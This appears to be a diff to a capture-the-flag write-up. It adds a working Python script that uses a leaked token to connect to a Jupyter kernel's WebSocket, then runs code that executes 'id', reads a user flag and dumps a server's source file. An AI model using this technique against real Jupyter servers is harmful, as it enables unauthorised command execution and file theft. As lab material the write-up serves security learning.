@@ -1510,9 +1510,97 @@ If missing:
 
 `pip3 install websocket-client`
 
-Create the file jupyter_exec.py in your working directory:
+Create the file `jupyter_exec.py` in your working directory:
 
+```python
+import json, uuid, time, threading, websocket
 
+TOKEN     = "a7f3b2c9d8e1f4a5b6c7d8e9f0a1b2c3d4e5f6a7"
+KERNEL_ID = "43e96841-8b17-4c27-bf04-987bd7f206f8"
+
+CODE = """
+import os
+print("=== id ===")
+print(os.popen("id").read().strip())
+print("\\n=== USER FLAG ===")
+try:
+    print(open('/home/analyst/user.txt').read().strip())
+except Exception as e:
+    print(f"ERROR: {e}")
+print("\\n=== /opt/opsmcp/server.py ===")
+try:
+    print(open('/opt/opsmcp/server.py').read())
+except Exception as e:
+    print(f"ERROR: {e}")
+"""
+
+collected = []
+done      = threading.Event()
+MSG_ID    = str(uuid.uuid4())
+
+def on_message(ws, raw):
+    msg      = json.loads(raw)
+    msg_type = msg.get("header", {}).get("msg_type", "")
+    parent   = msg.get("parent_header", {}).get("msg_id", "")
+
+    if msg_type == "stream" and parent == MSG_ID:
+        collected.append(msg["content"]["text"])
+    elif msg_type == "error" and parent == MSG_ID:
+        for line in msg["content"]["traceback"]:
+            collected.append(line + "\n")
+    elif msg_type == "execute_reply" and parent == MSG_ID:
+        time.sleep(0.3)
+        done.set()
+
+def on_open(ws):
+    print("[*] Connected — waiting 2s for kernel ready state...")
+    time.sleep(2)
+    print("[*] Sending execute_request...")
+    ws.send(json.dumps({
+        "header": {
+            "msg_id":   MSG_ID,
+            "username": "attacker",
+            "session":  str(uuid.uuid4()),
+            "msg_type": "execute_request",
+            "version":  "5.3"
+        },
+        "parent_header": {},
+        "metadata":      {},
+        "content": {
+            "code":             CODE,
+            "silent":           False,
+            "store_history":    False,
+            "user_expressions": {},
+            "allow_stdin":      False
+        },
+        "channel": "shell"
+    }))
+
+def on_error(ws, err):
+    print(f"[!] WS error: {err}")
+    done.set()
+
+ws = websocket.WebSocketApp(
+    f"ws://localhost:18888/api/kernels/{KERNEL_ID}/channels",
+    header={"Authorization": f"token {TOKEN}"},
+    on_message=on_message,
+    on_open=on_open,
+    on_error=on_error
+)
+
+t = threading.Thread(target=ws.run_forever)
+t.daemon = True
+t.start()
+
+if done.wait(timeout=30):
+    ws.close()
+    print("".join(collected))
+    print("[*] Done.")
+else:
+    ws.close()
+    print("[!] Timed out — partial output:")
+    print("".join(collected))
+```
 
 A Python script using `websocket-client` was written to connect to the kernel WebSocket endpoint, send an `execute_request` message, and collect the `stream` output:
 
